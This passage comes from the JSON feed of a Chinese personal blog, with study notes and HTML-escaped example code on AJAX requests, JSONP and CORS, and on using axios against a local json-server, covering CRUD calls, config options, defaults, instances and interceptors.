//判断响应状态码 200 404 403 401 500 if (xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300) &#123; // 处理结果 行 头 空行 体 // 响应 console.log(&#x27;状态码&#x27;, xhr.status); console.log(&#x27;状态字符串&#x27;, xhr.statusText); console.log(&#x27;所有响应头&#x27;, xhr.getAllResponseHeaders()); console.log(&#x27;响应体&#x27;, xhr.response); //设置 result 的文本 result.innerHTML = xhr.response; // 结束。可以看出并没有进行页面刷新就拿到了结果。 &#125; else &#123; &#125; &#125; &#125; &#125; &lt;/script&gt;&lt;/body&gt; server.js文件同上一节。 接上节：GET 请求设置请求参数在url后面直接缀参数即可，用问号分割然后加参数名和值；多个参数用&amp;分割。xhr.open(&#39;GET&#39;, &#39;http://127.0.0.1:8000/server?a=100&amp;b=200&amp;c=300&#39;)Network选项卡中的结果如下。在Headers选项卡-&gt;Query String Parameters也可以进行参数确认。 案例——POST——AJAX发送POST请求鼠标放到div中，发post请求，将响应体放在div中呈现。即红色框中显示文字”Hello Ajax POST”。 post.html: 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Ajax POST 请求&lt;/title&gt; &lt;style&gt; #result &#123; width: 200px; height: 100px; border: solid 1px #903; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;result&quot;&gt;&lt;/div&gt; &lt;script&gt; // 获取元素对象 const result = document.getElementById(&#x27;result&#x27;); // 绑定事件 result.addEventListener(&quot;mouseover&quot;, function()&#123; // 1. 创建对象 const xhr = new XMLHttpRequest(); // 2. 初始化 设置类型（请求方式）与url xhr.open(&#x27;POST&#x27;, &#x27;http://127.0.0.1:8000/server&#x27;); // 3. 发送 设置请求参数（请求体） xhr.send(&#x27;a=100&amp;b=200&amp;c=300&#x27;); // 4. 事件绑定 xhr.onreadystatechange = function()&#123; // 判断 if(xhr.readyState === 4)&#123; if(xhr.status &gt;=200 &amp;&amp; xhr.status &lt; 300)&#123; // 处理服务端返回的结果 result.innerHTML = xhr.response; &#125; &#125; &#125; &#125;); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 如果直接用GET案例中的server.js，会发现报错。原因是因为服务端没有与POST请求匹配的路由规则，只有一个GET的规则。需要添加POST路由规则： 123456app.post(&#x27;/server&#x27;, (request, response) =&gt; &#123; // 设置响应头, 设置允许跨域 response.setHeader(&#x27;Access-Control-Allow-Origin&#x27;, &#x27;*&#x27;); // 设置响应体 response.send(&quot;Hello Ajax POST&quot;);&#125;); 注意JS代码修改后要重新启动服务才能生效。 接上节：POST 请求设置请求体参数 POST不能把参数写在url里！ 请求体是在.send()中设置的，参数的形式可以以url的形式多个参数用&amp;分割：xhr.send(&#39;a=100&amp;b=200&amp;c=300&#39;) POST请求体在Headers选项卡-&gt;Request Payload进行参数确认。 新版谷歌浏览器把requst payload变成独立标签放在headers右边。 请求体中的格式是很灵活的，除了上面的形式，还可以写xhr.send(&#39;a:100&amp;b:200&amp;c:300&#39;)；xhr.send(&#39;112233&#39;)。但需要注意的是，无论请求体中写的是什么，服务端(server.js)一定要有与之对应的处理方式。 接上节：POST请求设置请求头信息前文中已经给出了请求行的方法&#x2F;路径&#x2F;参数的设置方法和请求体的设置方法。还剩一个设置请求头信息。一般会把身份校验的信息放在头信息里然后传给服务器，服务器对参数做提取并对用户身份进行校验。 POST请求设置请求头信息，只需要在send()方法后调用一个方法setRequesHeader(&#39;头的名字&#39;,&#39;头的值&#39;)即可。 12// 设置请求体内容的类型xhr.setRequesHeader(&#x27;Content-Type&#x27;,&#x27;application/x-www-from-urlencoded&#x27;); 其中，Content-Type是用来设置请求体内容的类型的；application/x-www-from-urlencoded是一个固定写法，是用来设置请求体中参数字符串的类型的。 还可以设置响应头允许自定义请求头： 12// 自定义头信息xhr.setRequesHeader(&#x27;name&#x27;, &#x27;Bob&#x27;); 但这需要在server.js文件中的post路由规则改成all，并添加如下语句： 1response.setHeader(&#x27;Access-Control-Allow-Header&#x27;,&#x27;*&#x27;); 修改后的当前路由规则如下： 123456789// 可以接收任意类型的请求app.all(&#x27;/server&#x27;, (request, response) =&gt; &#123; // 设置响应头 设置允许跨域 response.setHeader(&#x27;Access-Control-Allow-Origin&#x27;, &#x27;*&#x27;); // 响应头 response.setHeader(&#x27;Access-Control-Allow-Header&#x27;,&#x27;*&#x27;); // 设置响应体 response.send(&quot;Hello Ajax POST&quot;);&#125;); 案例——json数据请求1234567891011121314app.all(&#x27;/json-server&#x27;, (request, response) =&gt; &#123; // 设置响应头, 设置允许跨域 response.setHeader(&#x27;Access-Control-Allow-Origin&#x27;, &#x27;*&#x27;); // 设置响应头, 设置允许自定义头信息 response.setHeader(&#x27;Access-Control-Allow-Headers&#x27;, &#x27;*&#x27;); // 响应一个数据 const data = &#123; name: &#x27;atguigu&#x27; &#125;; // 对 对象 进行 字符串 转换 let str = JSON.stringify(data) // 设置响应体 response.send(str);&#125;); 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;JSON&lt;/title&gt; &lt;style&gt; #result &#123; width: 200px; height: 100px; border: solid 1px #89b; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;result&quot;&gt;&lt;/div&gt; &lt;script&gt; const result = document.getElementById(&#x27;result&#x27;); // 绑定键盘按下事件 window.onkeydown = function()&#123; // 发送请求 const xhr = new XMLHttpRequest(); // *2*.(自动转换) 设置响应体数据的类型(自动转换) xhr.responseType = &#x27;json&#x27;; // 初始化 xhr.open(&#x27;GET&#x27;, &#x27;http://127.0.0.1:8000/json-server&#x27;); // 发送 xhr.send(); // 事件绑定 xhr.onreadystatechange = function()&#123; if(xhr.readyState === 4)&#123; if(xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300)&#123; console.log(xhr.response); // 1. 手动对数据转化 (字符串再转换成json) // let data = JSON.parse(xhr.response); //转换成json // result.innerHTML = data.name; // *2*. (自动转换)自动转换(自动转换) result.innerHTML = xhr.response.name; //已经自动变成json &#125; &#125; &#125; &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 请求超时与网络异常12345678910// 超时设置 （2秒）xhr.timeout = 2000;// 超时回调xhr.ontimeout = function()&#123; alert(&#x27;网络超时，请稍后重试&#x27;)&#125;// 网络异常回调xhr.onerror = function()&#123; alert(&#x27;网络异常，请稍后重试&#x27;)&#125; 取消请求12// 手动取消xhr.abort() 请求重复发送问题解决 IE 缓存问题问题：在一些浏览器中(IE),由于缓存机制的存在，ajax 只会发送的第一次请求，剩余多次请求不会在发送给浏览器而是直接加载缓存中的数据。解决方式：浏览器的缓存是根据url 地址来记录的，所以我们只需要修改url 地址即可避免缓存问题。 1xhr.open(&quot;get&quot;,&quot;/testAJAX?t=&quot;+Date.now()); API总结 XMLHttpRequest()：创建 XHR 对象的构造函数 status：响应状态码值，如 200、404 statusText：响应状态文本，如 ’ok‘、‘not found’ readyState：标识请求状态的只读属性 0-1-2-3-4 onreadystatechange：绑定 readyState 改变的监听 responseType：指定响应数据类型，如果是 ‘json’，得到响应后自动解析响应 response：响应体数据，类型取决于 responseType 的指定 timeout：指定请求超时时间，默认为 0 代表没有限制 ontimeout：绑定超时的监听 onerror：绑定请求网络错误的监听 open()：初始化一个请求，参数为：(method, url[, async]) send(data)：发送请求 abort()：中断请求 （发出到返回之间） getResponseHeader(name)：获取指定名称的响应头值 getAllResponseHeaders()：获取所有响应头组成的字符串 setRequestHeader(name, value)：设置请求头 API 的分类 REST API: restful （Representational State Transfer (资源)表现层状态转化）(1) 发送请求进行CRUD 哪个操作由请求方式来决定(2) 同一个请求路径可以进行多个操作(3) 请求方式会用到GET&#x2F;POST&#x2F;PUT&#x2F;DELETE 非REST API: restless(1) 请求方式不决定请求的CRUD 操作(2) 一个请求路径只对应一个操作(3) 一般只有GET&#x2F;POST 跨域问题同源策略同源策略(Same-Origin Policy)最早由Netscape 公司提出，是浏览器的一种安全策略同源： 协议、域名、端口号必须完全相同跨域： 违背同源策略就是跨域 JSONP JSONP 是什么JSONP(JSON with Padding)，是一个非官方的跨域解决方案，纯粹凭借程序员的聪明才智开发出来，只支持get 请求。 JSONP 怎么工作的？在网页有一些标签天生具有跨域能力，比如：img link iframe script。JSONP 就是利用script 标签的跨域能力来发送请求的。 JSONP 的使用 1.动态的创建一个script 标签：var script = document.createElement(&quot;script&quot;)2.设置script 的src，设置回调函数 1234script.src = &quot;http://localhost:3000/testAJAX?callback=abc&quot;;function abc(data) &#123; alert(data.name);&#125;; 3.将script 添加到body 中：document.body.appendChild(script)4.服务器中路由的处理 123456789router.get(&quot;/testAJAX&quot; , function (req , res) &#123; console.log(&quot;收到请求&quot;); var callback = req.query.callback; var obj = &#123; name:&quot;孙悟空&quot;, age:18 &#125; res.send(callback+&quot;(&quot;+JSON.stringify(obj)+&quot;)&quot;);&#125;); CORShttps://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS CORS 是什么？CORS（Cross-Origin Resource Sharing），跨域资源共享。CORS 是官方的跨域解决方案，它的特点是不需要在客户端做任何特殊的操作，完全在服务器中进行处理，支持get 和post 请求。跨域资源共享标准新增了一组HTTP 首部字段，允许服务器声明哪些源站通过浏览器有权限访问哪些资源 CORS 怎么工作的？CORS 是通过设置一个响应头来告诉浏览器，该请求允许跨域，浏览器收到该响应以后就会对响应放行。 CORS 的使用主要是服务器端的设置：123456router.get(&quot;/testAJAX&quot; , function (req , res) &#123; //通过res 来设置响应头，来允许跨域请求 //res.set(&quot;Access-Control-Allow-Origin&quot;,&quot;http://127.0.0.1:3000&quot;); res.set(&quot;Access-Control-Allow-Origin&quot;,&quot;*&quot;); res.send(&quot;testAJAX 返回的响应&quot;);&#125;);","categories":[{"name":"前端","slug":"前端","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/"},{"name":"JS","slug":"前端/JS","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/JS/"}],"tags":[{"name":"JS","slug":"JS","permalink":"https://avalooooooon.github.io/tags/JS/"}]},{"title":"axios笔记","slug":"axios笔记","date":"2022-11-01T07:44:59.000Z","updated":"2022-11-01T07:44:59.000Z","comments":true,"path":"2022/11/01/axios笔记/","link":"","permalink":"https://avalooooooon.github.io/2022/11/01/axios%E7%AC%94%E8%AE%B0/","excerpt":"","text":"官方文档一个开放接口 Productionaxios是前端最流行的 ajax 请求库，react&#x2F;vue 官方都推荐使用 axios 发 ajax 请求。在浏览器中可以利用axios向服务端发送ajax请求来获取数据，在node环境可以利用axios向远端服务发送HTTP请求。也就是它可以在两个环境中运行。它有以下几个特点： 基于 xhr + promise 的异步 ajax 请求库 浏览器端&#x2F;node 端都可以使用 支持请求&#x2F;响应拦截器 支持请求取消 请求&#x2F;响应数据转换 批量发送多个请求 axios的原理如下图： 准备工作：使用 json-server 搭建REST API在线文档 json-server 是一个用来快速搭建REST API 的工具包，它可以快速帮我们搭建一个http服务。 需要搭建http服务是因为后期用axios的时候需要向服务端发送请求，因此我们需要一个这样的角色来与axios结合做实践。 下载：npm install -g json-server，这里使用了全局安装 目标根目录下创建数据库 json 文件：db.json 123456789101112131415161718192021222324&#123; &quot;posts&quot;: [ &#123; &quot;id&quot;: 1, &quot;title&quot;: &quot;json-server&quot;, &quot;author&quot;: &quot;typicode&quot; &#125;, &#123; &quot;id&quot;: 2, &quot;title&quot;: &quot;json-server2&quot;, &quot;author&quot;: &quot;typicode&quot; &#125; ], &quot;comments&quot;: [ &#123; &quot;id&quot;: 1, &quot;body&quot;: &quot;some comment&quot;, &quot;postId&quot;: 1 &#125; ], &quot;profile&quot;: &#123; &quot;name&quot;: &quot;typicode&quot; &#125;&#125; 这里的posts：文章；comments：评论，profile：作者信息。 启动服务：json-server --watch db.json。注意启动服务时命令行定位到的目录一定是db.json所位于的文件夹。这个命令可以理解成，现在要启动json-server，它启动的数据位于的文件是db.json，注意这个文件的路径要写对。 成功启动后出现如图提示：可以看到列出了三个url，可以访问。分别是posts、comments和profile这三个资源。 除了获取之外，可以在官网看到关于REST API的其他操作，部分如下：第一行的含义是获取所有文章，第二行/posts/id意为获取指定文章；第三行POST 路径就是新增文件，请求路径是/posts，请求类型是POST，然后把数据传到请求体里就可以新增内容；还可以更新&#x2F;删除内容。使用浏览器分别访问 http://localhost:3000/posts 和 http://localhost:3000/posts/1 进行测试。 至此已经实现了json-server服务的构建。有了它，就可以用axios向它发送请求然后获取结果了。 axios 基本使用查看官方文档。在给出的几种下载方式里，如果是在项目中使用axios，推荐使用npm或yarn的下载方式。现在由于是在学习，所以采用最后两种CDN的方式进行引入。新建测试文件，引入axios并测试： 12345678910111213&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script src=&quot;https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt; console.log(axios) &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 又是cdn的网址（比如这里的https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js ）可能会访问比较慢，为了提高访问速度，可以把这个资源换成国内服务器的。访问https://www.bootcdn.cn 。在搜索框中输入axios，复制链接&lt;script src=&quot;https://cdn.bootcdn.net/ajax/libs/axios/1.1.3/axios.min.js&quot;&gt;&lt;/script&gt;并在上面的html文件中进行替换。两种链接的输出结果相同。 通过axios()函数发送AJAX请求。该函数接受一个对象作为参数，这个对象有几种属性：请求类型method、请求URLurl等。 函数axios()的返回类型是一个promise，所以可以通过then()指定成功和失败时的回调。 示例：使用axios访问上面的json-server服务器并实现增删改查 注意这部分需要开启前文中已经配置好的json-server服务器！ 在一个网页放四个按钮，尝试为这四个按钮添加可以实现相关功能的点击事件：点击不同按钮发送不同的ajax请求，包括GET、POST、PUT、DELETE。给上一节实现的json- server发请求，，url是http://localhost:3000，这里的端口号是3000。 引入axios文件：&lt;script src=&quot;https://cdn.bootcdn.net/ajax/libs/axios/1.1.3/axios.min.js&quot;&gt;&lt;/script&gt; GET，即需要实现查看时的请求： 123456789101112// 查看id为2的文章详情function testGet() &#123; // 发送AJAX请求 axios(&#123; // 请求类型 method: &#x27;GET&#x27;, // URL url: &#x27;http://localhost:3000/posts/2&#x27; &#125;).then(response =&gt; &#123; console.log(response) &#125;)&#125; 使用不同的url会有不同的输出结果：axios.get(‘http://localhost:3000/posts&#39;) &#x2F;&#x2F; 返回一个数组，数组里有两个对象axios.get(‘http://localhost:3000/posts/1&#39;) &#x2F;&#x2F; 返回一个对象axios.get(‘http://localhost:3000/posts?id=1&#39;) &#x2F;&#x2F; 返回一个数组，数组里有一个对象 直接点击GET按钮，控制台中可以看到打印的结果response。 如果控制台中的日志一闪就没，可以从右上角的小齿轮进入偏好设置，勾选控制台-&gt;“在浏览时保留日志”网络中的日志一闪就没，可以在上一步的偏好设置中勾选网络-&gt;“保留日志”，也可以进入网络选项卡直接勾选“保留日志”。 打开网络（Network）选项卡，清空后点击GET按钮，可以看到请求已经成功发送。点击名称为2的http请求，在“标头”（Headers）中选择“请求标头”（Request Headers），点击“查看源代码”（view source)，查看请求报文，看到请求类型“GET”和请求路径“&#x2F;posts&#x2F;2”：点击“响应”（Response），查看返回结果，可以看到返回的确实是id为2的文章信息：3. POST，即需要实现添加时的请求类型，POST除了必须的请求类型和URL外还需要有请求体： 1234567891011121314151617// 添加一篇新的文章function testPost() &#123; // 发送AJAX请求 axios(&#123; // 请求类型 method: &#x27;POST&#x27;, // URL url: &#x27;http://localhost:3000/posts&#x27;, // 请求体 data: &#123; title: &quot;没课，好得很&quot;, author: &quot;张三&quot; &#125; &#125;).then(response =&gt; &#123; console.log(response) &#125;)&#125;直接点击POST按钮，控制台中可以看到打印的结果response。打开网络（Network）选项卡，清空后点击POST按钮，可以看到请求已经成功发送。点击状态码为201的http请求，在“标头”（Headers）中选择“请求标头”（Request Headers），点击“查看源代码”（view source)，查看请求报文，看到请求类型“POST”和请求路径“&#x2F;posts”：点击“载荷”（Payload），点击“查看源代码”（view source)，查看请求体（Request Payload），可以看到请求体是一个JSON格式的字符串：传递给服务器的就是这个JSON格式的字符串，JSON-Server服务接收到这个东西后会对它进行保存。查看文件db.json，可以看到这个id为3的文章就已经添加好了。4. PUT，即需要实现更新时的请求类型，打算把刚添加的那篇文章的作者从张三改成李四，PUT除了必须的请求类型和URL外还需要有请求体和id，也就是url的末尾需要添加/id： 1234567891011121314151617// 更新数据function testPut() &#123; // 发送AJAX请求 axios(&#123; // 请求类型 method: &#x27;PUT&#x27;, // URL url: &#x27;http://localhost:3000/posts/3&#x27;, // 请求体 data: &#123; title: &quot;没课，好得很&quot;, author: &quot;李四&quot; &#125; &#125;).then(response =&gt; &#123; console.log(response) &#125;)&#125;按照上面的步骤查看各内容；同时可以发现db.json也发生了变化，id3的作者已经成功变为李四。5. DELETE，即需要实现删除时的请求类型，打算把之前添加的、在上一步中作者被改成了李四的那篇文章删掉，delete请求不需要请求体，直接把url一放就可以删除指定id的文章： 123456789101112// 删除数据function testDelete() &#123; // 发送AJAX请求 axios(&#123; // 请求类型 method: &#x27;DELETE&#x27;, // URL url: &#x27;http://localhost:3000/posts/3&#x27;, &#125;).then(response =&gt; &#123; console.log(response) &#125;)&#125;按照上面的步骤查看各内容；同时可以发现db.json也发生了变化，id3已经成功删除。 完整的.html文件内的代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script src=&quot;https://cdn.bootcdn.net/ajax/libs/axios/1.1.3/axios.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div&gt; &lt;button onclick=&quot;testGet()&quot;&gt;GET请求&lt;/button&gt; &lt;button onclick=&quot;testPost()&quot;&gt;POST请求&lt;/button&gt; &lt;button onclick=&quot;testPut()&quot;&gt;PUT请求&lt;/button&gt; &lt;button onclick=&quot;testDelete()&quot;&gt;DELETE请求&lt;/button&gt; &lt;/div&gt; &lt;script&gt; function testGet() &#123; axios(&#123; method: &#x27;GET&#x27;, url: &#x27;http://localhost:3000/posts/2&#x27; &#125;).then(response =&gt; &#123; console.log(response) &#125;) &#125; function testPost() &#123; axios(&#123; method: &#x27;POST&#x27;, url: &#x27;http://localhost:3000/posts&#x27;, data: &#123; title: &quot;没课，好得很&quot;, author: &quot;张三&quot; &#125; &#125;).then(response =&gt; &#123; console.log(response) &#125;) &#125; function testPut() &#123; axios(&#123; method: &#x27;PUT&#x27;, url: &#x27;http://localhost:3000/posts/3&#x27;, data: &#123; title: &quot;没课，好得很&quot;, author: &quot;李四&quot; &#125; &#125;).then(response =&gt; &#123; console.log(response) &#125;) &#125; function testDelete() &#123; axios(&#123; method: &#x27;DELETE&#x27;, url: &#x27;http://localhost:3000/posts/3&#x27;, &#125;).then(response =&gt; &#123; console.log(response) &#125;) &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; axios其他方式发送请求除了可以使用axios()函数发送请求，还可以使用axios对象身上的一些方法发送请求。下面给出两个使用示例，其它api的使用方法都类似，在对应的场景中可以选择合适的api使用。 axios.request(config): 等同于 axios(config)它的使用方式和函数axios()一模一样，都是接收一个对象作为参数，这个对象里包括很多属性比如请求类型method、url等；它返回的也是一个promise对象。把上一节中的GET按钮对应的函数改成如下代码进行测试： 12345678function testGet() &#123; axios.request(&#123; method: &#x27;GET&#x27;, url: &#x27;http://localhost:3000/comments&#x27; &#125;).then(response =&gt; &#123; console.log(response) &#125;)&#125; 可以省略配置项名称”method”和“url“，直接写即可。 可打开浏览器，查看控制台和network各个属性情况。2. axios.post(url[, data, config]): 发 post 请求三个参数分别为url，请求体和config，后两个参数是可选的。把上一节中的POST按钮对应的函数改成如下代码进行测试，要实现的功能是为id为2的文章添加评论，根据db.json中的格式编写请求体内容，这里省略属性名： 12345678910function testPost() &#123; axios.post( &#x27;http://localhost:3000/comments&#x27;, &#123; body: &quot;json-server2的评论&quot;, &quot;postId&quot;: 2 &#125;).then(response =&gt; &#123; console.log(response) &#125;)&#125; axios响应结果的结构 响应报文包括四个部分：响应行、响应头、响应空行、响应体。 分别点击上一节中写好的两个按钮：GET和POST。在控制台console中可以看到输出结果（如果输出一闪而过，在右上角设置中勾选“保留日志”），点击response左边的展开按钮可以查看response详情（如果点击展开按钮无效，不要在live server运行.html文件，而是直接在文件管理器中打开文件）。 以点击GET按钮后的输出结果为例，如下图。有以下几种属性： config：配置对象，请求类型method、请求url、请求体等内容都在这一项中保存。 data：响应体。之所以是一个对象，是因为axios自动对服务器返回结果进行json解析并转化为对象，方便对结果进行处理。 headers：响应头。 request：原生的AJAX请求对象。axios的作用是发送ajax请求，而发送ajax请求需要用到底层的XMLHttpRequest；这个request所保存的就是当前axios在发送请求时所创建的那个AJAX请求对象，即XMLHttpRequest实例对象。 status：响应状态码。 statusText：响应状态字符串。 axios配置对象官方文档 就是axios在调用时所接受的参数对象。这个配置对象并不单指axios()参数里的对象，还包括request、get、POST，它们当中都会用到这个参数对象；但凡是提到了config这个参数，指的其实都是配置对象。查看官方文档，可以看到这个配置对象中可以设置以下几种内容： url：指明要给谁发送请求 method：设置请求类型，get、post、put什么的就在这设置 baseURL：设定URL的基础结构，axios内部会自动将baseURL与url进行结合，形成最终的url结果。在这一项中填写协议、域名、端口，在url中只需填写后续路径即可。如baseURL：http://localhost:3000，url：/comments。 transformRequest：它可以将请求的数据进行处理，再将处理后的结果发送给服务器。 transformResponse：它可以将响应的数据进行处理，我们利用自定义的回调处理最后的结果。 以上两个参数分别对请求和响应的数据进行预处理，处理后再进行发送和响应的处理。 headers：配置请求头信息。某些项目进行身份校验时就要求在头信息中加入一些特殊的标识，再检验请求是否满足条件，此时就可以利用headers控制请求头的信息。 params：用来设定url参数，是一个对象。有时向服务端发送请求时需要传递url参数，如a=100&amp;b=200，写起来不方便；axios允许我们在配置对象时添加一个属性params，可以在对象当中设置这些内容。比如想发对象，在url中写:url:/posts；想加参数，写一个params:&#123; a:100,b:200 &#125;，最后这个params对象会变成一个参数字符串缀在url后面，再向服务端发送请求。 paramsSerializer：配置参数序列化，用得较少。作用是对请求的参数做序列化，转变成一个字符串。比如请求的参数是&#123; a:100,b:200 &#125;，默认情况下会把这个值转变成/post?a=100&amp;b=200。也可能在服务端接口要求这样传：/post/a/100/b/200，或者/post/a.100/b.200，这种形式就需要对这个对象进行处理转换成正确格式的字符串，与服务器统一。 data（对象形式）：设置请求体，有两种形式。如果是对象形式，如data: &#123; firstName: &#39;Fred&#39; &#125;，axios会将其转化成json格式字符串进行传递。 data（字符串形式）：设置请求体，有两种形式。如果是字符串形式，如data: &#39;Country=Brasil&amp;City=Belo Horizonte&#39;，axios会将其直接传递。其实就是表单传送方式，键名&#x3D;键值+&amp;符分割。 这两种方式都会经常用到。如果项目中要求请求体为JSON，就用第一种；要求请求体为url的参数传递形式的话就用第二种。 timeout：发送请求的最大允许超时时间，单位ms。如果超过这个时间请求就会被取消。 withCredentials：设置跨域请求时cookie的携带。false是不携带，true则意味着跨域请求时会把cookie携带过去。 adapter：设置请求的适配器。有两种，分别是发送AJAX的，和在nodejs中发送http的。两个运行环境。 auth：设置请求的基础验证。用户名密码。 responseType：设置响应体的结果格式。默认值为JSON，即服务器默认的返回结果是JSON格式的，结果到达后会自动对其做一个转换。 responseEncoding：设置响应结果的编码。默认值为&#39;utf8&#39;。 xsrfCookieName：设置跨站请求的标识：对cookie的名字进行设置。 xsrfHeaderName：设置跨站请求的标识：对头信息进行设置。 这两个是安全设置，保证请求是来自自己的客户端而不是一些其他的未知客户端。为什么能实现保护作用？需要结合服务器进行说明。服务器在返回结果时会返回一个唯一标识，下次发请求时需要把这个唯一标识再传递过去，服务器认出它、检测没有问题之后才会做响应。有些网站页面里会加入一些链接，向我们的服务器发送请求。如果不做唯一标识去检验它，可能这个页面发送的请求就会直接对我们的结果造成影响；加了这个唯一参数后，我们的客户端可以把它加上，而其他客户端没有，就可以有效避免跨站攻击。 onUploadProgress：上传时的回调。 onDownloadProgress：下载时的回调。 maxContentLength：设置HTTP响应体的最大尺寸，单位为字节。 maxBodyLength：设置HTTP请求体的最大尺寸，单位为字节。 validateStatus：设置如何认定响应结果是成功的。一般不改。默认值为status &gt;= 200 &amp;&amp; status &lt; 300，即响应代码&gt;200并且&lt;300。 maxRedirects：最大跳转次数。当我们向一个服务发送请求时它做了跳转，做了跳转后还要不要继续向前进行请求。一般在nodejs用，前端的AJAX用不到。 socketPath：设置socket文件的位置。这个文件的作用是向docker的守护进程发送请求，即数据转发。和proxy有先后优先级的关系，如果同时设置了socket和文件代理proxy，优先使用socket httpAgent：设置客户端信息。如keep-alive（是否保持连接）。少用。 proxy：设置代理。只能在nodejs用。 做爬虫时，如果只用一个ip向目标服务器抓取数据，很可能被别人进到自己的ip。这时就可以借助很多中间代理，不断切换，发送请求。投票等任务同理。 cancelToken：对AJAX请求做取消的设置。 decompress：对响应结果是否进行解压。只能在nodejs用。 axios默认配置官方文档：Config Defaults它可以把一些重复性的设置配置在默认设置中，从而简化代码。思考本章第一小节各个按钮的实现。下面是GET按钮的实现： 12345678function testGet() &#123; axios(&#123; method: &#x27;GET&#x27;, url: &#x27;http://localhost:3000/posts/2&#x27; &#125;).then(response =&gt; &#123; console.log(response) &#125;)&#125; 在每个按钮的实现中都需要写请求类型method: &#39;xxx&#39;，而且每一次url都得写的很长。可以在方法外面添加默认配置： 12axios.defaults.method = &#x27;GET&#x27;; // 设置默认的请求类型为GETaxios.defaults.baseURL = &#x27;http://localhost:3000&#x27; // 设置基础URL 在后续的使用过程中，默认配置中写的内容无需重新配置。GET按钮的实现可以修改为下面这样，效果相同： 1234567function testGet() &#123; axios.request(&#123; url: &#x27;/posts&#x27; &#125;).then(response =&gt; &#123; console.log(response) &#125;)&#125; 查看官方文档，可以看到其他可以设置的值。下面测试默认params，配置后能否在network里看到请求添加了指定后缀params。设置语句为axios.defaults.params = &#123; id: 100 &#125;;，可以看到成功配置。 axios.create(config)创建一个拥有通用配置的axios实例:axios.create([config])。 axios.create()函数接受一个配置对象作为参数，里面可以写baseurl、timeout等等参数。 即根据指定配置创建一个新的 axios，也就是每个新 axios 都有自己的配置。新 axios 只是没有取消请求和批量发请求的方法，其它所有语法都是一致的。 创建实例对象发送请求的优势：当项目的接口数据服务不只来自于一个单一的服务器，有着不同的协议、域名、端口，此时用默认配置只能省一个事；这时候设置两个不一样名字的axios示例就很合适。接下来向不同的接口发请求时借用不同的实例对象即可。 axios创建实例对象发送AJAX请求具体创建如下（只展示了.html文件中的script部分代码）： 1234567891011// 创建实例对象const duanzi = axios.create(&#123; baseURL: &#x27;https://api.apiopen.top&#x27;, timeout: 2000&#125;)// duanzi 与 axios 对象的功能几近一样duanzi(&#123; url: &#x27;/api/sentences&#x27;,&#125;).then(response =&gt; &#123; console.log(response)&#125;) 通过create()创建出来的对象与axios本身的功能几近一致，这个新创建出来的对象也是当一个函数使用的。示例如下： 123456// duanzi 与 axios 对象的功能几近一样duanzi(&#123; url: &#x27;/api/sentences&#x27;,&#125;).then(response =&gt; &#123; console.log(response)&#125;) 除此之外，当然也可以利用封装好的方法发送请求。注意下面打印的结果是我们新创建的接口duanzi为我们返回的JSON数据转换后的js对象： 123duanzi.get(&#x27;/api/sentences&#x27;).then(response =&gt; &#123; console.log(response.data)&#125;) 拦截器（Interceptors）官方文档：Interceptors拦截器实际上就是一些函数，即 满足条件放行 。它分为两大类：请求拦截器 和 响应拦截器。 请求拦截器：发送请求前可以借助一些函数，对请求参数和内容做一些处理和检测，都没问题就去发送请求。如果存在问题，可以直接取消请求。 响应拦截器：服务器返回结果后，我们可以通过自己指定的回调对结果进行处理。响应拦截器可以在我们处理结果之前先对结果预处理，（比如失败则做一个失败结果的提醒、格式化处理数据结果。。。），没问题后再交由我们自己处理。有问题则在响应拦截器中处理掉，我们不需要去处理失败结果。 下面给出示例。复制粘贴官网上的代码放入&lt;script&gt;标签。可以看出，函数axios.interceptors.request.use()传入了两个函数作为参数，还有成功、失败两种情况的处理，可以知道拦截器的原理也是和promise相关的。 请求拦截器中的参数config：配置对象。也就是在请求拦截器中可以调整请求参数，比如可以利用语句config.params = 